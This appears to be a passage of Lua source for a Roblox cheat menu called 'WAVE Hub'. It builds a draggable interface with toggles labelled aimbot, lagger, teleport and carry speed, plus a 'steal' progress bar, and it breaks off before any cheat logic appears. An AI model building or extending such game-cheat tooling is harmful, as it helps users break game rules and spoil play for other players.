G.LogoPreload_kira.Name = "LogoPreload_kira"
G.LogoPreload_kira.BackgroundTransparency = 1
G.LogoPreload_kira.Size = UDim2.new(0, 64, 0, 64)
G.LogoPreload_kira.Visible = false
G.LogoPreload_kira.Image = "rbxthumb://type=Asset&id=125547726098040&w=420&h=420"
G.LogoPreload_kira.Parent = G.WaveLogoPreloadHolder

G.LogoPreload_dio = Instance.new("ImageLabel")
G.LogoPreload_dio.Name = "LogoPreload_dio"
G.LogoPreload_dio.BackgroundTransparency = 1
G.LogoPreload_dio.Size = UDim2.new(0, 64, 0, 64)
G.LogoPreload_dio.Visible = false
G.LogoPreload_dio.Image = "rbxthumb://type=Asset&id=125749412993183&w=420&h=420"
G.LogoPreload_dio.Parent = G.WaveLogoPreloadHolder

G.LogoPreload_kingcrimson = Instance.new("ImageLabel")
G.LogoPreload_kingcrimson.Name = "LogoPreload_kingcrimson"
G.LogoPreload_kingcrimson.BackgroundTransparency = 1
G.LogoPreload_kingcrimson.Size = UDim2.new(0, 64, 0, 64)
G.LogoPreload_kingcrimson.Visible = false
G.LogoPreload_kingcrimson.Image = "rbxasset://5a9ca42d5ed939bad79ba73d52810774/wave_king_crimson_minilogo.png"
G.LogoPreload_kingcrimson:SetAttribute("WaveImageRequest", "https://files.catbox.moe/lxi4pf.png")
G.LogoPreload_kingcrimson.Parent = G.WaveLogoPreloadHolder

G.LogoPreload_t636k9 = Instance.new("ImageLabel")
G.LogoPreload_t636k9.Name = "LogoPreload_t636k9"
G.LogoPreload_t636k9.BackgroundTransparency = 1
G.LogoPreload_t636k9.Size = UDim2.new(0, 64, 0, 64)
G.LogoPreload_t636k9.Visible = false
G.LogoPreload_t636k9.Image = "rbxasset://5a9ca42d5ed939bad79ba73d52810774/wave_t636k9_minilogo.png"
G.LogoPreload_t636k9:SetAttribute("WaveImageRequest", "https://files.catbox.moe/q7tes7.png")
G.LogoPreload_t636k9.Parent = G.WaveLogoPreloadHolder

G.LogoPreload_customwave = Instance.new("ImageLabel")
G.LogoPreload_customwave.Name = "LogoPreload_customwave"
G.LogoPreload_customwave.BackgroundTransparency = 1
G.LogoPreload_customwave.Size = UDim2.new(0, 64, 0, 64)
G.LogoPreload_customwave.Visible = false
G.LogoPreload_customwave.Image = "rbxasset://5a9ca42d5ed939bad79ba73d52810774/wave_custom_minilogo_v3.png"
G.LogoPreload_customwave:SetAttribute("WaveImageRequest", "https://files.catbox.moe/b2w3ck.png")
G.LogoPreload_customwave.Parent = G.WaveLogoPreloadHolder

G.MobileStackPanel = Instance.new("Frame")
G.MobileStackPanel.Name = "MobileStackPanel"
G.MobileStackPanel.Active = true
G.MobileStackPanel.BackgroundColor3 = Color3.fromRGB(4, 10, 28)
G.MobileStackPanel.BorderSizePixel = 0
G.MobileStackPanel.Position = UDim2.new(1, -170, 0.5, -145)
G.MobileStackPanel.Size = UDim2.new(0, 154, 0, 290)
G.MobileStackPanel.ZIndex = 10
G.MobileStackPanel.Parent = G.WAVEHubV1

G.UICorner_133 = Instance.new("UICorner")
G.UICorner_133.CornerRadius = UDim.new(0, 18)
G.UICorner_133.Parent = G.MobileStackPanel

G.UIStroke_88 = Instance.new("UIStroke")
G.UIStroke_88.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_88.Color = Color3.fromRGB(14, 32, 68)
G.UIStroke_88.Parent = G.MobileStackPanel

G.BgImage = Instance.new("ImageLabel")
G.BgImage.Name = "BgImage"
G.BgImage.BackgroundTransparency = 1
G.BgImage.BorderSizePixel = 0
G.BgImage.Size = UDim2.new(1, 0, 1, 0)
G.BgImage.Image = "rbxassetid://139548602866176"
G.BgImage.ImageTransparency = 0.15000000596046448
G.BgImage.ScaleType = Enum.ScaleType.Crop
G.BgImage:SetAttribute("WaveAppliedPanelSrc", "rbxthumb://type=Asset&id=139548602866176&w=420&h=420")
G.BgImage.Parent = G.MobileStackPanel

G.UICorner_134 = Instance.new("UICorner")
G.UICorner_134.CornerRadius = UDim.new(0, 18)
G.UICorner_134.Parent = G.BgImage

G.BgOverlay = Instance.new("Frame")
G.BgOverlay.Name = "BgOverlay"
G.BgOverlay.BackgroundColor3 = Color3.fromRGB(4, 10, 28)
G.BgOverlay.BackgroundTransparency = 0.5
G.BgOverlay.BorderSizePixel = 0
G.BgOverlay.Size = UDim2.new(1, 0, 1, 0)
G.BgOverlay.ZIndex = 2
G.BgOverlay.Parent = G.MobileStackPanel

G.UICorner_135 = Instance.new("UICorner")
G.UICorner_135.CornerRadius = UDim.new(0, 18)
G.UICorner_135.Parent = G.BgOverlay

G.StackBtn_autoLeft = Instance.new("Frame")
G.StackBtn_autoLeft.Name = "StackBtn_autoLeft"
G.StackBtn_autoLeft.Active = true
G.StackBtn_autoLeft.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.StackBtn_autoLeft.BackgroundTransparency = 0.10000000149011612
G.StackBtn_autoLeft.BorderSizePixel = 0
G.StackBtn_autoLeft.Position = UDim2.new(0, 14, 0, 14)
G.StackBtn_autoLeft.Size = UDim2.new(0, 58, 0, 58)
G.StackBtn_autoLeft.ZIndex = 12
G.StackBtn_autoLeft.Parent = G.MobileStackPanel

G.UICorner_136 = Instance.new("UICorner")
G.UICorner_136.CornerRadius = UDim.new(0, 10)
G.UICorner_136.Parent = G.StackBtn_autoLeft

G.TextLabel_84 = Instance.new("TextLabel")
G.TextLabel_84.BackgroundTransparency = 1
G.TextLabel_84.Position = UDim2.new(0, 5, 0, 5)
G.TextLabel_84.Size = UDim2.new(1, -10, 1, -10)
G.TextLabel_84.ZIndex = 6
G.TextLabel_84.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_84.Text = "AUTO LEFT"
G.TextLabel_84.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_84.TextSize = 9
G.TextLabel_84.TextWrapped = true
G.TextLabel_84.Parent = G.StackBtn_autoLeft

G.TextButton_61 = Instance.new("TextButton")
G.TextButton_61.BackgroundTransparency = 1
G.TextButton_61.BorderSizePixel = 0
G.TextButton_61.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_61.ZIndex = 20
G.TextButton_61.Text = ""
G.TextButton_61.Parent = G.StackBtn_autoLeft

G.StackBtn_autoRight = Instance.new("Frame")
G.StackBtn_autoRight.Name = "StackBtn_autoRight"
G.StackBtn_autoRight.Active = true
G.StackBtn_autoRight.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.StackBtn_autoRight.BackgroundTransparency = 0.10000000149011612
G.StackBtn_autoRight.BorderSizePixel = 0
G.StackBtn_autoRight.Position = UDim2.new(0, 82, 0, 14)
G.StackBtn_autoRight.Size = UDim2.new(0, 58, 0, 58)
G.StackBtn_autoRight.ZIndex = 12
G.StackBtn_autoRight.Parent = G.MobileStackPanel

G.UICorner_137 = Instance.new("UICorner")
G.UICorner_137.CornerRadius = UDim.new(0, 10)
G.UICorner_137.Parent = G.StackBtn_autoRight

G.TextLabel_85 = Instance.new("TextLabel")
G.TextLabel_85.BackgroundTransparency = 1
G.TextLabel_85.Position = UDim2.new(0, 5, 0, 5)
G.TextLabel_85.Size = UDim2.new(1, -10, 1, -10)
G.TextLabel_85.ZIndex = 6
G.TextLabel_85.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_85.Text = "AUTO RIGHT"
G.TextLabel_85.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_85.TextSize = 9
G.TextLabel_85.TextWrapped = true
G.TextLabel_85.Parent = G.StackBtn_autoRight

G.TextButton_62 = Instance.new("TextButton")
G.TextButton_62.BackgroundTransparency = 1
G.TextButton_62.BorderSizePixel = 0
G.TextButton_62.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_62.ZIndex = 20
G.TextButton_62.Text = ""
G.TextButton_62.Parent = G.StackBtn_autoRight

G.StackBtn_aimbot = Instance.new("Frame")
G.StackBtn_aimbot.Name = "StackBtn_aimbot"
G.StackBtn_aimbot.Active = true
G.StackBtn_aimbot.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.StackBtn_aimbot.BackgroundTransparency = 0.10000000149011612
G.StackBtn_aimbot.BorderSizePixel = 0
G.StackBtn_aimbot.Position = UDim2.new(0, 14, 0, 82)
G.StackBtn_aimbot.Size = UDim2.new(0, 58, 0, 58)
G.StackBtn_aimbot.ZIndex = 12
G.StackBtn_aimbot.Parent = G.MobileStackPanel

G.UICorner_138 = Instance.new("UICorner")
G.UICorner_138.CornerRadius = UDim.new(0, 10)
G.UICorner_138.Parent = G.StackBtn_aimbot

G.TextLabel_86 = Instance.new("TextLabel")
G.TextLabel_86.BackgroundTransparency = 1
G.TextLabel_86.Position = UDim2.new(0, 5, 0, 5)
G.TextLabel_86.Size = UDim2.new(1, -10, 1, -10)
G.TextLabel_86.ZIndex = 6
G.TextLabel_86.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_86.Text = "AIMBOT"
G.TextLabel_86.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_86.TextSize = 9
G.TextLabel_86.TextWrapped = true
G.TextLabel_86.Parent = G.StackBtn_aimbot

G.TextButton_63 = Instance.new("TextButton")
G.TextButton_63.BackgroundTransparency = 1
G.TextButton_63.BorderSizePixel = 0
G.TextButton_63.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_63.ZIndex = 20
G.TextButton_63.Text = ""
G.TextButton_63.Parent = G.StackBtn_aimbot

G.StackBtn_lagger = Instance.new("Frame")
G.StackBtn_lagger.Name = "StackBtn_lagger"
G.StackBtn_lagger.Active = true
G.StackBtn_lagger.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.StackBtn_lagger.BackgroundTransparency = 0.10000000149011612
G.StackBtn_lagger.BorderSizePixel = 0
G.StackBtn_lagger.Position = UDim2.new(0, 82, 0, 82)
G.StackBtn_lagger.Size = UDim2.new(0, 58, 0, 58)
G.StackBtn_lagger.ZIndex = 12
G.StackBtn_lagger.Parent = G.MobileStackPanel

G.UICorner_139 = Instance.new("UICorner")
G.UICorner_139.CornerRadius = UDim.new(0, 10)
G.UICorner_139.Parent = G.StackBtn_lagger

G.TextLabel_87 = Instance.new("TextLabel")
G.TextLabel_87.BackgroundTransparency = 1
G.TextLabel_87.Position = UDim2.new(0, 5, 0, 5)
G.TextLabel_87.Size = UDim2.new(1, -10, 1, -10)
G.TextLabel_87.ZIndex = 6
G.TextLabel_87.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_87.Text = "LAGGER NORMAL"
G.TextLabel_87.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_87.TextSize = 9
G.TextLabel_87.TextWrapped = true
G.TextLabel_87.Parent = G.StackBtn_lagger

G.TextButton_64 = Instance.new("TextButton")
G.TextButton_64.BackgroundTransparency = 1
G.TextButton_64.BorderSizePixel = 0
G.TextButton_64.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_64.ZIndex = 20
G.TextButton_64.Text = ""
G.TextButton_64.Parent = G.StackBtn_lagger

G.StackBtn_drop = Instance.new("Frame")
G.StackBtn_drop.Name = "StackBtn_drop"
G.StackBtn_drop.Active = true
G.StackBtn_drop.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.StackBtn_drop.BackgroundTransparency = 0.10000000149011612
G.StackBtn_drop.BorderSizePixel = 0
G.StackBtn_drop.Position = UDim2.new(0, 14, 0, 150)
G.StackBtn_drop.Size = UDim2.new(0, 58, 0, 58)
G.StackBtn_drop.ZIndex = 12
G.StackBtn_drop.Parent = G.MobileStackPanel

G.UICorner_140 = Instance.new("UICorner")
G.UICorner_140.CornerRadius = UDim.new(0, 10)
G.UICorner_140.Parent = G.StackBtn_drop

G.TextLabel_88 = Instance.new("TextLabel")
G.TextLabel_88.BackgroundTransparency = 1
G.TextLabel_88.Position = UDim2.new(0, 5, 0, 5)
G.TextLabel_88.Size = UDim2.new(1, -10, 1, -10)
G.TextLabel_88.ZIndex = 6
G.TextLabel_88.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_88.Text = "DROP BR"
G.TextLabel_88.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_88.TextSize = 9
G.TextLabel_88.TextWrapped = true
G.TextLabel_88.Parent = G.StackBtn_drop

G.TextButton_65 = Instance.new("TextButton")
G.TextButton_65.BackgroundTransparency = 1
G.TextButton_65.BorderSizePixel = 0
G.TextButton_65.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_65.ZIndex = 20
G.TextButton_65.Text = ""
G.TextButton_65.Parent = G.StackBtn_drop

G.StackBtn_lagger2 = Instance.new("Frame")
G.StackBtn_lagger2.Name = "StackBtn_lagger2"
G.StackBtn_lagger2.Active = true
G.StackBtn_lagger2.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.StackBtn_lagger2.BackgroundTransparency = 0.10000000149011612
G.StackBtn_lagger2.BorderSizePixel = 0
G.StackBtn_lagger2.Position = UDim2.new(0, 82, 0, 150)
G.StackBtn_lagger2.Size = UDim2.new(0, 58, 0, 58)
G.StackBtn_lagger2.ZIndex = 12
G.StackBtn_lagger2.Parent = G.MobileStackPanel

G.UICorner_141 = Instance.new("UICorner")
G.UICorner_141.CornerRadius = UDim.new(0, 10)
G.UICorner_141.Parent = G.StackBtn_lagger2

G.TextLabel_89 = Instance.new("TextLabel")
G.TextLabel_89.BackgroundTransparency = 1
G.TextLabel_89.Position = UDim2.new(0, 5, 0, 5)
G.TextLabel_89.Size = UDim2.new(1, -10, 1, -10)
G.TextLabel_89.ZIndex = 6
G.TextLabel_89.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_89.Text = "LAGGER CARRY"
G.TextLabel_89.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_89.TextSize = 9
G.TextLabel_89.TextWrapped = true
G.TextLabel_89.Parent = G.StackBtn_lagger2

G.TextButton_66 = Instance.new("TextButton")
G.TextButton_66.BackgroundTransparency = 1
G.TextButton_66.BorderSizePixel = 0
G.TextButton_66.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_66.ZIndex = 20
G.TextButton_66.Text = ""
G.TextButton_66.Parent = G.StackBtn_lagger2

G.StackBtn_tpDown = Instance.new("Frame")
G.StackBtn_tpDown.Name = "StackBtn_tpDown"
G.StackBtn_tpDown.Active = true
G.StackBtn_tpDown.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.StackBtn_tpDown.BackgroundTransparency = 0.10000000149011612
G.StackBtn_tpDown.BorderSizePixel = 0
G.StackBtn_tpDown.Position = UDim2.new(0, 14, 0, 218)
G.StackBtn_tpDown.Size = UDim2.new(0, 58, 0, 58)
G.StackBtn_tpDown.ZIndex = 12
G.StackBtn_tpDown.Parent = G.MobileStackPanel

G.UICorner_142 = Instance.new("UICorner")
G.UICorner_142.CornerRadius = UDim.new(0, 10)
G.UICorner_142.Parent = G.StackBtn_tpDown

G.TextLabel_90 = Instance.new("TextLabel")
G.TextLabel_90.BackgroundTransparency = 1
G.TextLabel_90.Position = UDim2.new(0, 5, 0, 5)
G.TextLabel_90.Size = UDim2.new(1, -10, 1, -10)
G.TextLabel_90.ZIndex = 6
G.TextLabel_90.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_90.Text = "TP DOWN"
G.TextLabel_90.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_90.TextSize = 9
G.TextLabel_90.TextWrapped = true
G.TextLabel_90.Parent = G.StackBtn_tpDown

G.TextButton_67 = Instance.new("TextButton")
G.TextButton_67.BackgroundTransparency = 1
G.TextButton_67.BorderSizePixel = 0
G.TextButton_67.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_67.ZIndex = 20
G.TextButton_67.Text = ""
G.TextButton_67.Parent = G.StackBtn_tpDown

G.StackBtn_carrySpeed = Instance.new("Frame")
G.StackBtn_carrySpeed.Name = "StackBtn_carrySpeed"
G.StackBtn_carrySpeed.Active = true
G.StackBtn_carrySpeed.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.StackBtn_carrySpeed.BackgroundTransparency = 0.10000000149011612
G.StackBtn_carrySpeed.BorderSizePixel = 0
G.StackBtn_carrySpeed.Position = UDim2.new(0, 82, 0, 218)
G.StackBtn_carrySpeed.Size = UDim2.new(0, 58, 0, 58)
G.StackBtn_carrySpeed.ZIndex = 12
G.StackBtn_carrySpeed.Parent = G.MobileStackPanel

G.UICorner_143 = Instance.new("UICorner")
G.UICorner_143.CornerRadius = UDim.new(0, 10)
G.UICorner_143.Parent = G.StackBtn_carrySpeed

G.TextLabel_91 = Instance.new("TextLabel")
G.TextLabel_91.BackgroundTransparency = 1
G.TextLabel_91.Position = UDim2.new(0, 5, 0, 5)
G.TextLabel_91.Size = UDim2.new(1, -10, 1, -10)
G.TextLabel_91.ZIndex = 6
G.TextLabel_91.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_91.Text = "CARRY SPEED"
G.TextLabel_91.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_91.TextSize = 9
G.TextLabel_91.TextWrapped = true
G.TextLabel_91.Parent = G.StackBtn_carrySpeed

G.TextButton_68 = Instance.new("TextButton")
G.TextButton_68.BackgroundTransparency = 1
G.TextButton_68.BorderSizePixel = 0
G.TextButton_68.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_68.ZIndex = 20
G.TextButton_68.Text = ""
G.TextButton_68.Parent = G.StackBtn_carrySpeed

G.WAVEButtonScale = Instance.new("UIScale")
G.WAVEButtonScale.Name = "WAVEButtonScale"
G.WAVEButtonScale.Scale = 0.69999998807907104
G.WAVEButtonScale.Parent = G.MobileStackPanel

local StealBarRoot = Instance.new("Frame")
StealBarRoot.Name = "StealBarRoot"
StealBarRoot.AnchorPoint = Vector2.new(0.5, 1)
StealBarRoot.BackgroundColor3 = Color3.fromRGB(8, 12, 28)
StealBarRoot.BorderSizePixel = 0
StealBarRoot.Position = UDim2.new(0.5, 0, 1, -100)
StealBarRoot.Size = UDim2.new(0, 315, 0, 53)
StealBarRoot.ZIndex = 50
StealBarRoot.Parent = G.WAVEHubV1

local StealUICorner = Instance.new("UICorner")
StealUICorner.CornerRadius = UDim.new(0, 10)
StealUICorner.Parent = StealBarRoot

local StealUIStroke = Instance.new("UIStroke")
StealUIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
StealUIStroke.Color = Color3.fromRGB(20, 60, 140)
StealUIStroke.Thickness = 1.5
StealUIStroke.Parent = StealBarRoot

local StealLabel = Instance.new("TextLabel")
StealLabel.Name = "StealLabel"
StealLabel.BackgroundTransparency = 1
StealLabel.Position = UDim2.new(0, 0, 0, -2)
StealLabel.Size = UDim2.new(1, 0, 0, 24)
StealLabel.ZIndex = 56
StealLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
StealLabel.Text = ".gg/waveduels"
StealLabel.TextColor3 = Color3.fromRGB(30, 100, 220)
StealLabel.TextSize = 13
StealLabel.Parent = StealBarRoot

local StealPingLabel = Instance.new("TextLabel")
StealPingLabel.Name = "PingLabel"
StealPingLabel.BackgroundTransparency = 1
StealPingLabel.Position = UDim2.new(0, 8, 1, -20)
StealPingLabel.Size = UDim2.new(0, 80, 0, 18)
StealPingLabel.ZIndex = 56
StealPingLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
StealPingLabel.Text = "PING: --"
StealPingLabel.TextColor3 = Color3.fromRGB(30, 100, 220)
StealPingLabel.TextSize = 10
StealPingLabel.TextXAlignment = Enum.TextXAlignment.Left
StealPingLabel.Parent = StealBarRoot

local StealFpsLabel = Instance.new("TextLabel")
StealFpsLabel.Name = "FpsLabel"
StealFpsLabel.BackgroundTransparency = 1
StealFpsLabel.Position = UDim2.new(1, -78, 1, -20)
StealFpsLabel.Size = UDim2.new(0, 70, 0, 18)
StealFpsLabel.ZIndex = 56
StealFpsLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
StealFpsLabel.Text = "FPS: --"
StealFpsLabel.TextColor3 = Color3.fromRGB(30, 100, 220)
StealFpsLabel.TextSize = 10
StealFpsLabel.TextXAlignment = Enum.TextXAlignment.Right
StealFpsLabel.Parent = StealBarRoot

local StealRadiusLabel = Instance.new("TextLabel")
StealRadiusLabel.Name = "RadiusLabel"
StealRadiusLabel.BackgroundTransparency = 1
StealRadiusLabel.Position = UDim2.new(0.5, -50, 1, -20)
StealRadiusLabel.Size = UDim2.new(0, 100, 0, 18)
StealRadiusLabel.ZIndex = 56
StealRadiusLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
StealRadiusLabel.Text = "Radius: 60"
StealRadiusLabel.TextColor3 = Color3.fromRGB(30, 100, 220)
StealRadiusLabel.TextSize = 10
StealRadiusLabel.Parent = StealBarRoot

local ProgressTrack = Instance.new("Frame")
ProgressTrack.Name = "ProgressTrack"
ProgressTrack.BackgroundColor3 = Color3.fromRGB(20, 35, 60)
ProgressTrack.BorderSizePixel = 0
ProgressTrack.Position = UDim2.new(0, 12, 0.5, -4)
ProgressTrack.Size = UDim2.new(1, -24, 0, 8)
ProgressTrack.ZIndex = 52
ProgressTrack.Parent = StealBarRoot

local ProgressUICorner = Instance.new("UICorner")
ProgressUICorner.CornerRadius = UDim.new(0, 4)
ProgressUICorner.Parent = ProgressTrack

local Fill = Instance.new("Frame")
Fill.Name = "Fill"
Fill.BackgroundColor3 = Color3.fromRGB(30, 100, 220)
Fill.BorderSizePixel = 0
Fill.Size = UDim2.new(0, 0, 1, 0)
Fill.ZIndex = 53
Fill.Parent = ProgressTrack

local FillUICorner = Instance.new("UICorner")
FillUICorner.CornerRadius = UDim.new(0, 4)
FillUICorner.Parent = Fill

local StealClickBtn = Instance.new("TextButton")
StealClickBtn.BackgroundTransparency = 1
StealClickBtn.Size = UDim2.new(1, 0, 1, 0)
StealClickBtn.ZIndex = 55
StealClickBtn.Text = ""
StealClickBtn.Parent = StealBarRoot

local StealScale = Instance.new("UIScale")
StealScale.Scale = 0.7
StealScale.Parent = StealBarRoot

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

G.MainOuter.Visible = true
G.MainOuter.Size = UDim2.new(0, 280, 0, 420)
G.MainOuter.ClipsDescendants = true
G.MainOuter.Active = true

for _, page in pairs({G.WavePage_Speed, G.WavePage_Combat, G.WavePage_Misc, G.WavePage_Visuals, G.WavePage_Interface, G.WavePage_Steal, G.WavePage_Movement}) do
	if page then page.Visible = false end
end

local isMinimized = false
local currentPage = "MAIN"
local currentScale = 0.7
local stealProgress = 0
local stealActive = false
local radiusValue = 60
local mobileToggles = {}

local pages = {
	MAIN     = G.WavePage_Speed,
	COMBAT   = G.WavePage_Combat,
	MISC     = G.WavePage_Misc,
	VISUALS  = G.WavePage_Visuals,
	UI       = G.WavePage_Interface,
	STEAL    = G.WavePage_Steal,
	MOVEMENT = G.WavePage_Movement,
}

local navButtons = {
	MAIN    = {btn = G.WaveNav_MAIN,     stroke = G.UIStroke},
	COMBAT  = {btn = G.WaveNav_COMBAT,   stroke = G.UIStroke_2},
	MISC    = {btn = G.WaveNav_MISC,     stroke = G.UIStroke_3},
	VISUALS = {btn = G.WaveNav_VISUALS,  stroke = G.UIStroke_4},
	UI      = {btn = G.WaveNav_CUSTOMIZE,stroke = G.UIStroke_5},
}

local function makeDraggable(frame, handle)
	handle = handle or frame
	local dragging, dragInput, dragStart, startPos

	local function update(input)
		local delta = input.Position - dragStart
		local newX = startPos.X.Offset + delta.X
		local newY = startPos.Y.Offset + delta.Y

		local cam = workspace.CurrentCamera
		if cam then
			local vs = cam.ViewportSize
			newX = math.clamp(newX, -frame.AbsoluteSize.X * 0.7, vs.X - frame.AbsoluteSize.X * 0.3)
			newY = math.clamp(newY, 0, vs.Y - 40)
		end

		frame.Position = UDim2.new(0, newX, 0, newY)
	end

	handle.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	handle.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end

makeDraggable(G.MainOuter, G.HeaderBar)
makeDraggable(StealBarRoot, StealBarRoot)
makeDraggable(G.MobileStackPanel, G.MobileStackPanel)

G.WaveMiniRestoreButton.Visible = false
G.WaveMiniRestoreTitle.Visible = false

local function setMinimized(state)
	isMinimized = state
	if state then
		TweenService:Create(G.MainOuter, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 1
		}):Play()
		task.delay(0.12, function()
			G.MainOuter.Visible = false
			G.MainOuter.BackgroundTransparency = 0
		end)
		G.WaveMiniRestoreButton.Visible = true
		G.WaveMiniRestoreTitle.Visible = true
		G.TextButton.Text = "+"
		G.WAVEMiniRestoreScale.Scale = 0.4
		TweenService:Create(G.WAVEMiniRestoreScale, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
	else
		G.MainOuter.Visible = true
		G.MainOuter.BackgroundTransparency = 1
		TweenService:Create(G.MainOuter, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0
		}):Play()
		G.WaveMiniRestoreButton.Visible = false
		G.WaveMiniRestoreTitle.Visible = false
		G.TextButton.Text = "-"
	end
end

G.TextButton.MouseButton1Click:Connect(function()
	setMinimized(not isMinimized)
end)

G.WaveMiniRestoreButton.MouseButton1Click:Connect(function()
	setMinimized(false)
end)

G.WaveMiniRestoreTitle.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		setMinimized(false)
	end
end)

local function selectPage(pageName)
	if currentPage == pageName then return end
	currentPage = pageName

	for name, page in pairs(pages) do
		if page then
			page.Visible = false
		end
	end

	local target = pages[pageName]
	if target then
		target.Visible = true
		target.CanvasPosition = Vector2.new(0, 0)
	end

	for name, data in pairs(navButtons) do
		local selected = (name == pageName)
		local targetBg = selected and Color3.fromRGB(20, 72, 160) or Color3.fromRGB(8, 18, 48)
		local targetText = selected and Color3.fromRGB(240, 245, 255) or Color3.fromRGB(70, 115, 180)
		local targetStroke = selected and Color3.fromRGB(45, 130, 230) or Color3.fromRGB(25, 90, 185)

		TweenService:Create(data.btn, TweenInfo.new(0.15), {
			BackgroundColor3 = targetBg,
			BackgroundTransparency = selected and 0 or 0.22,
			TextColor3 = targetText
		}):Play()

		if data.stroke then
			TweenService:Create(data.stroke, TweenInfo.new(0.15), {
				Color = targetStroke,
				Thickness = selected and 1.4 or 1
			}):Play()
		end
	end
end

G.WaveNav_MAIN.MouseButton1Click:Connect(function() selectPage("MAIN") end)
G.WaveNav_COMBAT.MouseButton1Click:Connect(function() selectPage("COMBAT") end)
G.WaveNav_MISC.MouseButton1Click:Connect(function() selectPage("MISC") end)
G.WaveNav_VISUALS.MouseButton1Click:Connect(function() selectPage("VISUALS") end)
G.WaveNav_CUSTOMIZE.MouseButton1Click:Connect(function() selectPage("UI") end)

selectPage("MAIN")

G.UIScale.Scale = currentScale
G.WAVEButtonScale.Scale = currentScale
StealScale.Scale = currentScale
if G.WAVEMiniRestoreScale then G.WAVEMiniRestoreScale.Scale = 1 end

local stackBtns = {
	{frame = G.StackBtn_autoLeft,   btn = G.TextButton_61, name = "AUTO LEFT"},
	{frame = G.StackBtn_autoRight,  btn = G.TextButton_62, name = "AUTO RIGHT"},
	{frame = G.StackBtn_aimbot,     btn = G.TextButton_63, name = "AIMBOT"},
	{frame = G.StackBtn_lagger,     btn = G.TextButton_64, name = "LAGGER NORMAL"},
	{frame = G.StackBtn_drop,       btn = G.TextButton_65, name = "DROP BR"},
	{frame = G.StackBtn_lagger2,    btn = G.TextButton_66, name = "LAGGER CARRY"},
	{frame = G.StackBtn_tpDown,     btn = G.TextButton_67, name = "TP DOWN"},
	{frame = G.StackBtn_carrySpeed, btn = G.TextButton_68, name = "CARRY SPEED"},
}

for _, data in ipairs(stackBtns) do
	mobileToggles[data.name] = false
	if data.btn and data.frame then
		data.btn.MouseButton1Click:Connect(function()
			mobileToggles[data.name] = not mobileToggles[data.name]
			local on = mobileToggles[data.name]

			local targetColor = on and Color3.fromRGB(20, 90, 200) or Color3.fromRGB(8, 18, 48)
			TweenService:Create(data.frame, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {
				BackgroundColor3 = targetColor
			}):Play()

